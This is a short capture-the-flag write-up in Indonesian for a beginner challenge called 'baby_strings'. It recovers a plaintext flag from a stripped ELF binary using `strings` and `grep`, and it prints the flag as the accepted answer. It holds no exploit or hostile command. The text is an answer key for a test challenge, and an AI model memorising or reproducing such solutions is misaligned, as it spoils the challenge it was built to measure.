**Pemahaman inti:** Flag disimpan sebagai literal plaintext di binary, jadi `strings` dan grep sudah cukup. Tidak ada obfuscation yang perlu dibongkar.

---

### 3. Analisis Awal (Recon / Discovery)

Binary berupa ELF 64-bit PIE yang sudah di-strip, sehingga tidak ada simbol yang membantu. Namun sebelum masuk ke disassembly, langkah termurah adalah memeriksa string yang dapat dicetak. `strings -n 4 baby_strings` langsung menampilkan flag dalam bentuk plaintext, dan `grep -i nfx` mempersempit hasilnya. Pemahaman kuncinya: stripped hanya menghilangkan simbol, bukan data; selama flag disimpan tanpa encoding, ia tetap terbaca sebagai string. Tidak perlu menjalankan binary atau melakukan decompile.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}`

- ELF 64-bit pie stripped (BuildID `dc3dc8f6…`), flag literal plaintext.
- `strings -n 4 baby_strings | grep -i nfx` → flag langsung. Tanpa run/decompile.

Reproduksi: `file baby_strings` memastikan format ELF 64-bit, lalu `strings -n 4 baby_strings | grep -i nfx` membaca tabel string dan mencocokkan pola flag. Tidak ada langkah dekripsi karena flag disimpan apa adanya, dan BuildID di atas dipakai sebagai penanda binary yang diuji.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

